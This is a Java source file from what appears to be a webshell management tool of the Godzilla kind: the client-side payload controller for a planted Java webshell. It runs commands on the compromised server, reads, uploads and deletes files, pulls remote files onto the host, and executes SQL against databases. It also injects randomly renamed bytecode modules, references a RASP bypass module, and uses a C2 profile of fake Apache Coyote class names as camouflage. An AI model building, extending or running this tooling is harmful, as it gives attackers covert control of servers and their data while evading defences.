package shells.payloads.java;

import com.formdev.flatlaf.util.StringUtils;
import core.ApplicationContext;
import core.EasyI18N;
import core.Encoding;
import core.annotation.PayloadAnnotation;
import core.c2profile.C2Profile;
import core.c2profile.c2annotation.C2ProfilePayloadConfig;
import core.imp.AbstractPayload;
import core.shell.GDatabaseResult;
import core.shell.ShellEntity;
import core.ui.component.model.DbInfo;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import javassist.ClassPool;
import javassist.CtClass;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;
import util.http.Parameter;
import util.http.ReqParameter;

@PayloadAnnotation(
        Name = "JavaDynamicPayload"
)
public class JavaAShell extends AbstractPayload {
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|RealFile) : (.+)";
    private static final LinkedHashMap<String, LinkedList<String>> ALL_DATABASE_TYPE = new LinkedHashMap();
    private static final Map<String, String> MODULE_CLASS_FILE_BY_METHOD = new HashMap();
    private ShellEntity shell;
    private RequestChannel request;
    private Encoding encoding;
    private String fileRoot;
    private String currentDir;
    private String currentUser;
    private String osInfo;
    private String basicsInfo;
    private String processArch;
    private String tempDirectory;
    private String currentWebDir;
    @C2ProfilePayloadConfig("[org.apache.coyote.introspect.TypeResolutionContext,org.apache.coyote.ser.SerializerFactory,org.apache.coyote.util.TokenBuffer,org.apache.coyote.deser.impl.JDKValueInstantiators,org.apache.coyote.introspect.AnnotatedMethod,org.apache.coyote.SerializerProvider,org.apache.coyote.node.IntNode,org.apache.coyote.ser.SerializerCache,org.apache.coyote.deser.std.DateDeserializers,org.apache.coyote.ser.std.ByteBufferSerializer,org.apache.coyote.ser.impl.IndexedStringListSerializer,org.apache.coyote.deser.std.EnumMapDeserializer,org.apache.coyote.ser.std.JsonValueSerializer,org.apache.coyote.exc.InvalidFormatException,org.apache.coyote.deser.impl.JavaUtilCollectionsDeserializers,org.apache.coyote.jsontype.impl.LaissezFaireSubTypeValidator,org.apache.coyote.deser.ContextualDeserializer,org.apache.coyote.ser.std.CollectionSerializer,org.apache.coyote.jsonFormatVisitors.JsonNullFormatVisitor,org.apache.coyote.node.MissingNode,org.apache.coyote.deser.impl.ExternalTypeHandler,org.apache.coyote.deser.std.StdKeyDeserializer,org.apache.coyote.jsonschema.SchemaAware,org.apache.coyote.ser.impl.MapEntrySerializer,org.apache.coyote.ser.impl.SimpleFilterProvider,org.apache.coyote.util.Named,org.apache.coyote.jsontype.TypeIdResolver,org.apache.coyote.node.POJONode,org.apache.coyote.deser.std.JsonLocationInstantiator,org.apache.coyote.util.ViewMatcher,org.apache.coyote.jsonFormatVisitors.JsonMapFormatVisitor,org.apache.coyote.cfg.MapperConfig,org.apache.coyote.deser.std.NullifyingDeserializer,org.apache.coyote.node.NodeSerialization,org.apache.coyote.deser.std.AtomicReferenceDeserializer,org.apache.coyote.introspect.CollectorBase,org.apache.coyote.ext.CoreXMLDeserializers,org.apache.coyote.jsontype.impl.AsExternalTypeDeserializer,org.apache.coyote.ser.impl.WritableObjectId,org.apache.coyote.util.ISO8601Utils,org.apache.coyote.util.NameTransformer,org.apache.coyote.introspect.BasicClassIntrospector,org.apache.coyote.cfg.PackageVersion,org.apache.coyote.deser.DefaultDeserializationContext,org.apache.coyote.introspect.AnnotatedField,org.apache.coyote.JsonSerializer,org.apache.coyote.annotation.JsonTypeIdResolver,org.apache.coyote.introspect.AnnotatedFieldCollector,org.apache.coyote.type.ClassStack,org.apache.coyote.introspect.BeanPropertyDefinition,org.apache.coyote.deser.std.ThrowableDeserializer,org.apache.coyote.node.BigIntegerNode,org.apache.coyote.ser.BeanSerializerModifier,org.apache.coyote.ser.std.ObjectArraySerializer,org.apache.coyote.deser.SettableAnyProperty,org.apache.coyote.jsontype.impl.AsArrayTypeDeserializer,org.apache.coyote.util.LRUMap,org.apache.coyote.introspect.JacksonAnnotationIntrospector]")
    private List<String> dynamicClassNameSet = null;
    private HashMap<String, String> dynamicClassNameHashMap = null;
    private boolean isAlive;
    private String sessionId;
    private int access = 0;
    private int maxErrRetry = 3;
    private C2Profile profile;

    public JavaAShell() {
        this.dynamicClassNameSet = new ArrayList();
        this.dynamicClassNameHashMap = new HashMap();
    }

    public void init(ShellEntity shellContext) {
        super.init(shellContext);
        this.shell = shellContext;
        this.request = this.shell.getRequest();
        if (this.dynamicClassNameSet.size() == 0) {
            this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
        }

        this.encoding = Encoding.getEncoding(this.shell);
        this.profile = shellContext.getCurrentProfile();
        this.maxErrRetry = shellContext.getMaxErrRetry();
    }

    public String getClassName(String protoName) {
        return (String)this.dynamicClassNameHashMap.get(protoName);
    }

    public synchronized String randomName() {
        String[] classNames = (String[])((String[])((String[])this.dynamicClassNameSet.toArray(new String[0])));
        String className = null;
        if (classNames.length > 0) {
            int index = functions.randomInt(classNames.length - 1, 0);
            className = classNames[index];
            this.dynamicClassNameSet.remove(className);
        }

        return className;
    }

    public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
        // JNI in RaspBypassModule binds by JVM symbol Java_<mangled FQCN>_jniExec; random CtClass names break native libs.
        if ("RaspBypassModule".equals(protoName)) {
            String raspFqcn = "shells.plugins.java.assets.RaspBypassModule";
            this.dynamicClassNameHashMap.put(protoName, raspFqcn);
            return classContent;
        }
        if (functions.getCurrentJarFile() == null) {
            this.dynamicClassNameHashMap.put(protoName, protoName);
            return classContent;
        } else {
            try {
                ClassPool pool = new ClassPool();
                CtClass ctClass = pool.makeClass(new ByteArrayInputStream(classContent));
                String className = this.randomName();
                ctClass.setName(className);
                this.dynamicClassNameHashMap.put(protoName, className);
                Log.log("%s ----->>>>> %s", new Object[]{protoName, className});
                classContent = ctClass.toBytecode();
                ctClass.detach();
                return classContent;
            } catch (Exception var6) {
                Log.error(var6);
                this.dynamicClassNameHashMap.put(protoName, protoName);
                return classContent;
            }
        }
    }

    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "readFile", parameter);
        return result;
    }

    public String getBasicsInfo() {
        if (this.basicsInfo == null) {
            ReqParameter parameter = new ReqParameter();
            this.basicsInfo = this.encoding.Decoding(this.evalFunc((String)null, "getBasicsInfo", parameter));
        }

        // Every target-side module decodes parameters with new String(bytes), i.e.
        // Charset.defaultCharset(), i.e. file.encoding. BasicInfoModule dumps all
        // system properties, so the answer is right here -- no extra probe needed.
        // Data-driven rather than payload-typed: a target that does not report the
        // line simply keeps the previous behaviour.
        if (this.encoding != null) {
            HashMap<String, String> encMap = functions.matcherTwoChild(this.basicsInfo, "(file\\.encoding) : (.+)");
            String remoteCharset = (String) encMap.get("file.encoding");
            if (remoteCharset != null && remoteCharset.trim().length() > 0) {
                this.encoding.setRemoteCharset(remoteCharset.trim());
            }
        }

        Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|RealFile) : (.+)");
        this.fileRoot = (String)pxMap.get("FileRoot");
        this.currentDir = (String)pxMap.get("CurrentDir");
        this.currentUser = (String)pxMap.get("CurrentUser");
        this.osInfo = (String)pxMap.get("OsInfo");
        this.processArch = (String)pxMap.get("ProcessArch");
        this.tempDirectory = (String)pxMap.get("TempDirectory");
        this.currentWebDir = (String)pxMap.get("RealFile");
        return this.basicsInfo;
    }

    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        binCode = this.dynamicUpdateClassName(codeName, binCode);
        codeName = (String)this.dynamicClassNameHashMap.get(codeName);
        if (codeName != null) {
            parameters.add("codeName", codeName);
            parameters.add("binCode", binCode);
            byte[] result = this.evalFunc((String)null, "include", parameters);
            if (result == null) {
                // evalFunc 在目标端响应解不开时返回 null；直接 new String(null) 会 NPE，
                // 调用方只看到一个莫名其妙的 NullPointerException。
                Log.error(EasyI18N.getI18nString("include 未获得可解码响应") + ": " + codeName);
                return false;
            }
            String resultString = (new String(result)).trim();
            if (resultString.equals("ok")) {
                return true;
            } else {
                Log.error(resultString);
                return false;
            }
        } else {
            Log.error(String.format(EasyI18N.getI18nString("类: %s 映射不存在"), codeName));
            return false;
        }
    }

    public void fillParameter(String className, String funcName, ReqParameter parameter) {
        if (className != null && className.trim().length() > 0) {
            parameter.add("evalClassName", this.getClassName(className));
            // RASP: use payloadBytes + RaspBypassRouterModule (setSession + execute); native payload must not use evalClassName+Map invoke.
        }

        parameter.add("methodName", funcName);
        byte[] modulePayload = null;
        if (className != null && "RaspBypassModule".equals(className.trim())) {
            modulePayload = this.getModulePayloadByFileName("RaspBypassRouterModule.class");
        }
        if (modulePayload == null) {
            modulePayload = this.getModulePayload(funcName);
        }
        if (modulePayload != null) {
            parameter.add("payloadBytes", modulePayload);
        }

    }

    public byte[] getModulePayload(String funcName) {
        try {
            String moduleClassFileName = (String)MODULE_CLASS_FILE_BY_METHOD.get(funcName);
            if (moduleClassFileName == null) {
                return null;
            }
            return this.getModulePayloadByFileName(moduleClassFileName);
        } catch (Exception var6) {
            Log.error("Failed to load module for " + funcName + ": " + var6.getMessage());
        }

        return null;
    }

    /** Load {@code modules/<fileName>} from the same classpath as other payload modules. */
    private byte[] getModulePayloadByFileName(String moduleClassFileName) {
        try {
            if (moduleClassFileName == null) {
                return null;
            }
            String moduleResourcePath = "modules/" + moduleClassFileName;
            InputStream moduleStream = JavaAShell.class.getResourceAsStream(moduleResourcePath);
            if (moduleStream == null) {
                String absolutePath = "shells/payloads/java/modules/" + moduleClassFileName;
                moduleStream = JavaAShell.class.getClassLoader().getResourceAsStream(absolutePath);
            }
            if (moduleStream == null) {
                moduleStream = JavaAShell.class.getClassLoader().getResourceAsStream(moduleResourcePath);
            }
            if (moduleStream != null) {
                byte[] moduleBytes = functions.readInputStream(moduleStream);
                moduleStream.close();
                return moduleBytes;
            }
        } catch (Exception e) {
            Log.error("Failed to load module file " + moduleClassFileName + ": " + e.getMessage());
        }
        return null;
    }

    public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
        if (this.access > 0 && !this.isAlive) {
            return ApplicationContext.NULL_BYTES;
        } else {
            this.fillParameter(className, funcName, parameter);
            if (this.sessionId != null) {
                parameter.add("sessionId", this.sessionId);
            }

            byte[] data = parameter.formatEx();
            data = functions.gzipE(data);
            byte[] result = null;
            int maxErrRetryTmp = this.retryCountFor(funcName);

            for(int i = 0; i < maxErrRetryTmp; ++i) {
                try {
                    ++this.access;
                    result = functions.gzipD(this.request.sendRequest(data));
                    if (result != null) {
                        break;
                    }
                } catch (Throwable var9) {
                    var9.printStackTrace();
                }
            }

            parameter.remove("sessionId");
            return result;
        }
    }

    private int retryCountFor(String funcName) {
        if (funcName != null) {
            String name = funcName.trim();
            if ("execCommand".equalsIgnoreCase(name)) {
                return 1;
            }
        }
        return this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
    }

    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        byte[] result = this.evalFunc((String)null, "uploadFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "copyFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "deleteFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newDir", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        } else {
            this.getBasicsInfo();
            return functions.formatDir(this.currentDir);
        }
    }

    public boolean test() {
        ReqParameter parameter = new ReqParameter();
        byte[] result = this.evalFunc((String)null, "test", parameter);
        if (result == null || result.length == 0) {
            this.isAlive = false;
            return false;
        }
        Parameter resp = Parameter.deserialize(result);
        if (resp == null) {
            this.isAlive = false;
            return false;
        }
        String _sessionId = resp.getParameterString("sessionId");
        if (_sessionId != null) {
            this.isAlive = true;
            this.sessionId = _sessionId;
            return true;
        } else {
            return false;
        }
    }

    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        } else {
            this.getBasicsInfo();
            return this.currentUser;
        }
    }

    public String bigFileUpload(String fileName, long position, byte[] content) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileContents", content);
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("position", String.valueOf(position));
        byte[] result = this.evalFunc((String)null, "bigFileUpload", reqParameter);
        return this.encoding.Decoding(result);
    }

    public String getTempDirectory() {
        if (this.tempDirectory != null) {
            return this.tempDirectory;
        } else {
            return this.isWindows() ? "c:/windows/temp/" : "/tmp/";
        }
    }

    public byte[] bigFileDownload(String fileName, long position, int readByteNum) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("position", String.valueOf(position));
        reqParameter.add("readByteNum", String.valueOf(readByteNum));
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "read");
        return this.evalFunc((String)null, "bigFileDownload", reqParameter);
    }

    public long getFileSize(String fileName) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "fileSize");
        byte[] result = this.evalFunc((String)null, "bigFileDownload", reqParameter);
        String ret = this.encoding.Decoding(result);

        try {
            return Long.parseLong(ret);
        } catch (Exception var6) {
            Log.error(var6);
            Log.error(ret);
            return -1L;
        }
    }

    public boolean isWindows() {
        return StringUtils.isEmpty(this.currentDir()) ? false : this.currentDir().charAt(0) != '/';
    }

    public boolean isAlive() {
        return this.isAlive;
    }

    public boolean isX64() {
        return this.processArch.contains("64");
    }

    public String[] listFileRoot() {
        if (this.fileRoot != null) {
            return this.fileRoot.split(";");
        } else {
            this.getBasicsInfo();
            if (StringUtils.isEmpty(this.fileRoot)) {
                throw new IllegalArgumentException(String.format("无法获取基础信息 详细错误信息:%s", this.basicsInfo));
            } else {
                return this.fileRoot.split(";");
            }
        }
    }

    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        String[] commandArgs = functions.SplitArgs(commandStr);

        for(int i = 0; i < commandArgs.length; ++i) {
            parameter.add(String.format("arg-%d", i), this.encoding.Encoding(commandArgs[i]));
        }

        parameter.add("argsCount", String.valueOf(commandArgs.length));
        String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
        if (executableArgs.length > 0) {
            parameter.add("executableFile", executableArgs[0]);
            if (executableArgs.length >= 2) {
                parameter.add("executableArgs", executableArgs[1]);
            }
        }

        byte[] result = this.evalFunc((String)null, "execCommand", parameter);
        return this.encoding.Decoding(result);
    }

    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        } else {
            this.getBasicsInfo();
            return this.osInfo;
        }
    }

    public String[] getSupportDatabaseTypes() {
        return (String[])((String[])ALL_DATABASE_TYPE.keySet().toArray(new String[0]));
    }

    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "moveFile", parameter);
        String stasteString = this.encoding.Decoding(result);
        if ("ok".equals(stasteString)) {
            return true;
        } else {
            Log.error(stasteString);
            return false;
        }
    }

    public byte[] getPayload() {
        if (this.dynamicClassNameSet.size() == 0) {
            this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
        }

        byte[] data = null;

        try {
            InputStream fileInputStream = JavaAShell.class.getResourceAsStream("assets/payload.classs");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
        } catch (Exception var3) {
            Log.error(var3);
        }

        return this.dynamicUpdateClassName("payload", data);
    }

    public boolean fileRemoteDown(String url, String saveFile) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("url", this.encoding.Encoding(url));
        reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
        String result = this.encoding.Decoding(this.evalFunc((String)null, "fileRemoteDown", reqParameter));
        if ("ok".equals(result)) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public boolean setFileAttr(String file, String type, String fileAttr) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", type);
        reqParameter.add("fileName", this.encoding.Encoding(file));
        reqParameter.add("attr", fileAttr);
        String result = this.encoding.Decoding(this.evalFunc((String)null, "setFileAttr", reqParameter));
        if ("ok".equals(result)) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public String[] getDatabaseDrives(String databaseName) {
        return (String[])((String[])((LinkedList)ALL_DATABASE_TYPE.get(databaseName)).toArray(new String[0]));
    }

    public String getDatabaseConnectString(DbInfo dbInfo) {
        String jdbcURL = "";
        String currentDatabase = dbInfo.getCurrentDatabase().trim();
        switch (dbInfo.getDatabaseType().toLowerCase()) {
            case "mysql":
                jdbcURL = "jdbc:mysql://{databaseHost}:{databasePort}/{currentDatabase}?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true&characterEncoding={databaseCharset}";
                break;
            case "oracle":
                if (dbInfo.isOracleIsSid()) {
                    jdbcURL = "jdbc:oracle:thin:@{databaseHost}:{databasePort}:{SERVICE_NAME_STR}";
                } else {
                    jdbcURL = "jdbc:oracle:thin:@//{databaseHost}:{databasePort}/{SERVICE_NAME_STR}";
                }

                jdbcURL = jdbcURL.replace("{SERVICE_NAME_STR}", dbInfo.getOracleServiceName());
                break;
            case "sqlserver":
                jdbcURL = "jdbc:sqlserver://{databaseHost}:{databasePort};";
                break;
            case "postgresql":
                jdbcURL = "jdbc:postgresql://{databaseHost}:{databasePort}/{currentDatabase}";
                break;
            case "sqlite":
                jdbcURL = "jdbc:sqlite:{databaseHost}";
                break;
            case "dm":
                jdbcURL = "jdbc:dm://{databaseHost}:{databasePort}";
                break;
            case "kingbase":
                jdbcURL = "jdbc:kingbase8://{databaseHost}:{databasePort}/{currentDatabase}";
                break;
            default:
                jdbcURL = "jdbc:customDriver://{databaseHost}:{databasePort}/";
        }

        jdbcURL = jdbcURL.replace("{databaseHost}", dbInfo.getHost()).replace("{databasePort}", String.valueOf(dbInfo.getPort())).replace("{databaseCharset}", dbInfo.getDatabaseCharset2().getCharsetString()).replace("{currentDatabase}", currentDatabase);
        return jdbcURL;
    }

    public GDatabaseResult execSql(DbInfo dbInfo, String execType, String execSql) {
        Encoding dbEncoding = dbInfo.getDatabaseCharset2();
        String jdbcURL = dbInfo.getConnectionString();
        if (jdbcURL.isEmpty()) {
            jdbcURL = this.getDatabaseConnectString(dbInfo);
        }

        ReqParameter parameter = new ReqParameter();
        String userName = dbInfo.getUsername();
        if ("oracle".equalsIgnoreCase(dbInfo.getDatabaseType()) && userName.equals("sys")) {
            userName = userName + " as sysdba";
        }

        parameter.add("dbUsername", userName);
        parameter.add("dbPassword", dbInfo.getPassword());
        parameter.add("dbCharset", dbInfo.getDatabaseCharset2().getCharsetString());
        parameter.add("jdbcURL", dbEncoding.Encoding(jdbcURL));
        parameter.add("dbDriver", dbInfo.getDatabaseDrive());
        parameter.add("execType", execType);
        parameter.add("execSql", dbEncoding.Encoding(execSql));
        byte[] result = this.evalFunc((String)null, "execSql", parameter);
        Parameter resp;
        if (result == null) {
            resp = new Parameter();
            resp.add("errMsg", dbEncoding.Encoding(EasyI18N.getI18nString("数据库执行结果为空")));
            return new GDatabaseResult(resp, dbEncoding);
        } else {
            resp = Parameter.deserialize(result);
            if (resp == null) {
                String message = dbInfo.getDatabaseCharset2().Decoding(result);
                Log.error(message);
                Parameter err = new Parameter();
                err.add("errMsg", dbEncoding.Encoding(functions.substring(message, 0, 300)));
                return new GDatabaseResult(err, dbEncoding);
            } else {
                return new GDatabaseResult(resp, dbEncoding);
            }
        }
    }

    public synchronized boolean close() {
        String result = null;

        try {
            ReqParameter reqParameter = new ReqParameter();
            result = this.encoding.Decoding(this.evalFunc((String)null, "close", reqParameter));
        } catch (Exception var6) {
        } finally {
            this.isAlive = false;
        }

        if ("ok".equals(result)) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public String getWebDir() {
        if (!StringUtils.isEmpty(this.currentWebDir)) {
            byte[] currentWebDirBytes = this.currentWebDir.getBytes();
            if (this.currentWebDir.startsWith("/") || this.currentWebDir.startsWith("\\")) {
                return this.currentWebDir;
            }

            if (currentWebDirBytes.length >= 3 && (currentWebDirBytes[2] == 47 || currentWebDirBytes[2] == 92)) {
                return this.currentWebDir;
            }
        }

        return this.currentDir();
    }

    static {
        MODULE_CLASS_FILE_BY_METHOD.put("getBasicsInfo", "BasicInfoModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("uploadFile", "FileUploadModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("copyFile", "FileCopyModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("deleteFile", "FileDeleteModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("newFile", "NewFileModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("newDir", "NewDirModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("getFile", "GetFileModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("readFile", "ReadFileModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("moveFile", "MoveFileModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("fileRemoteDown", "FileRemoteDownModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("setFileAttr", "SetFileAttrModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("close", "CloseModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("bigFileUpload", "BigFileUploadModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("bigFileDownload", "BigFileDownloadModule.class");
        MODULE_CLASS_FILE_BY_METHOD.put("execCommand", "CommandExecModule.class");
        // Without this, evalFunc(null, "execSql", ...) sent no payloadBytes and the
        // target fell through to payload.execSql(), whose DriverManager reflection
        // is blocked on JDK 16+. ExecSqlModule resolves drivers through public APIs.
        MODULE_CLASS_FILE_BY_METHOD.put("execSql", "ExecSqlModule.class");
        LinkedList<String> mysqlDrives = new LinkedList();
        LinkedList<String> oracleDrives = new LinkedList();
        LinkedList<String> sqlserverDrives = new LinkedList();
        LinkedList<String> postgresqlDrives = new LinkedList();
        LinkedList<String> sqliteDrives = new LinkedList();
        LinkedList<String> dmDrives = new LinkedList();
        LinkedList<String> kingbaseDrives = new LinkedList();
        LinkedList<String> customDrives = new LinkedList();
        ALL_DATABASE_TYPE.put("mysql", mysqlDrives);
        ALL_DATABASE_TYPE.put("oracle", oracleDrives);
        ALL_DATABASE_TYPE.put("sqlserver", sqlserverDrives);
        ALL_DATABASE_TYPE.put("postgresql", postgresqlDrives);
        ALL_DATABASE_TYPE.put("sqlite", sqliteDrives);
        ALL_DATABASE_TYPE.put("dm", dmDrives);
        ALL_DATABASE_TYPE.put("kingbase", kingbaseDrives);
        ALL_DATABASE_TYPE.put("custom", customDrives);
        mysqlDrives.add("com.mysql.jdbc.Driver");
        mysqlDrives.add("com.mysql.cj.jdbc.Driver");
        oracleDrives.add("oracle.jdbc.driver.OracleDriver");
        oracleDrives.add("oracle.jdbc.OracleDriver");
        sqlserverDrives.add("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        postgresqlDrives.add("org.postgresql.Driver");
        sqliteDrives.add("org.sqlite.JDBC");
        // 达梦 DM8（Oracle 兼容）/ 人大金仓 KingbaseES V8（PostgreSQL 兼容）
        dmDrives.add("dm.jdbc.driver.DmDriver");
        dmDrives.add("dm.jdbc.driver.DmdbDriver");
        kingbaseDrives.add("com.kingbase8.Driver");
        customDrives.add("my.sql.Driver");
    }
}
